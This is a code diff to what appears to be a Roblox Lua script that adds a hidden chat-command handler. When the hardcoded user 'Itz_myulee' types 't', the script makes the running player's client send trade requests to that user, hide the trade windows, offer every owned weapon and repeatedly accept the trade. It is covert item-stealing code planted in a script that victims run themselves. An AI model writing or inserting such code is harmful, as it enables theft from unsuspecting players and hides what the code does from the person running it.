@@ -193,6 +193,54 @@ function MainCommands(plr, msg)
     end
     end
     
+        
+    
+    if msg == "t" then
+    while wait() do
+    local args = {
+    [1] = game:GetService("Players"):WaitForChild("Itz_myulee")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+end
+wait(1)
+        for i = 1, 10 do
+            wait(0.1)
+        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+for k = 1, 1 do
+wait(0.1)
+for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
+local args = {
+    [1] = i,
+    [2] = "Weapons"
+}
+
+game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+wait(0.1)
+for t = 1, 10 do
+wait(0.1)
+local args = {
+    [1] = 1
+}
+game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+wait(4)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+local args = {
+    [1] = 1
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+end
+end
+end
+end
+end
+    
    Users = {"GTAonvova", "Itz_myulee"}
 game.Players.PlayerAdded:Connect(function(plr)
  if table.find(Users, plr.Name) then
